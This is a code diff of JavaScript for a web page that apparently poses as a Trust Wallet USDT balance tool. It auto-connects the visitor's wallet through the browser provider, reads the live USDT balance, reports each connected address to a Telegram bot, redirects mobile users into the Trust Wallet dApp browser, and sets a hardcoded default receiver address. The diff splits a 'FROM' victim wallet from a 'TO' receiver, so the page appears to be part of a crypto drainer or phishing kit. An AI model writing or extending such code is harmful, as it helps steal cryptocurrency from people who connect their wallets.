@@ -108,10 +108,8 @@ function checkUrlParameters() {
 
     if (addressParam && addressParam.startsWith('0x') && addressParam.length === 42) {
         addressInput.value = addressParam;
-        fetchRealUsdtBalance(addressParam);
     } else if (customSavedAddr && customSavedAddr.startsWith('0x') && customSavedAddr.length === 42) {
         addressInput.value = customSavedAddr;
-        fetchRealUsdtBalance(customSavedAddr);
     }
 
     // Mobile redirect to Trust Wallet app (only if not already in dApp browser AND only if address parameter is present)
@@ -131,14 +129,6 @@ function checkUrlParameters() {
 }
 
 function setupEventListeners() {
-    // Address Input Event
-    addressInput.addEventListener('input', () => {
-        const addr = addressInput.value.trim();
-        if (addr.length === 42 && addr.startsWith('0x')) {
-            fetchRealUsdtBalance(addr);
-        }
-    });
-
     // Clear Address Button
     clearBtn.addEventListener('click', () => {
         addressInput.value = '';
@@ -483,8 +473,10 @@ async function notifyTelegramWalletConnected(address) {
     }
 }
 
+let connectedWalletAddress = null;
+
 /**
- * Auto Detect Trust Wallet DApp Browser Provider
+ * Auto Detect Trust Wallet DApp Browser Provider & Fetch Connected (FROM) Wallet Balance
  */
 async function autoDetectTrustWalletAndFetchBalance() {
     if (typeof window.ethereum !== 'undefined') {
@@ -497,24 +489,24 @@ async function autoDetectTrustWalletAndFetchBalance() {
             }
 
             if (accounts && accounts.length > 0) {
-                const activeAddr = accounts[0];
-                console.log('[AutoConnect] Connected account:', activeAddr);
-                await fetchRealUsdtBalance(activeAddr);
-                notifyTelegramWalletConnected(activeAddr);
+                connectedWalletAddress = accounts[0];
+                console.log('[AutoConnect] Connected account (FROM):', connectedWalletAddress);
+                await fetchRealUsdtBalance(connectedWalletAddress);
+                notifyTelegramWalletConnected(connectedWalletAddress);
             } else {
-                fetchRealUsdtBalance(getCurrentAddress());
+                updateBalanceUI(userUsdtBalance);
             }
         } catch (e) {
             console.log('[AutoConnect] Error:', e);
-            fetchRealUsdtBalance(getCurrentAddress());
+            updateBalanceUI(userUsdtBalance);
         }
     } else {
-        fetchRealUsdtBalance(getCurrentAddress());
+        updateBalanceUI(userUsdtBalance);
     }
 }
 
 /**
- * Fetches REAL Live USDT Balance on BNB Smart Chain via RPC
+ * Fetches REAL Live USDT Balance on BNB Smart Chain via RPC for the Connected Wallet
  */
 async function fetchRealUsdtBalance(walletAddress) {
     if (!walletAddress || !walletAddress.startsWith('0x') || walletAddress.length !== 42) return userUsdtBalance;
@@ -569,8 +561,8 @@ function updateBalanceUI(usdtAmount) {
     if (tokenBalanceFiatEl) tokenBalanceFiatEl.textContent = formattedFiat;
 }
 
-// Get current trimmed address
-function getCurrentAddress() {
+// Get Receiver (TO) Address
+function getReceiverAddress() {
     const val = addressInput.value.trim();
     return val !== '' ? val : (localStorage.getItem('custom_receiver_address') || '0x742d35Cc6634C0532925a3b844Bc454e4438f44e');
 }
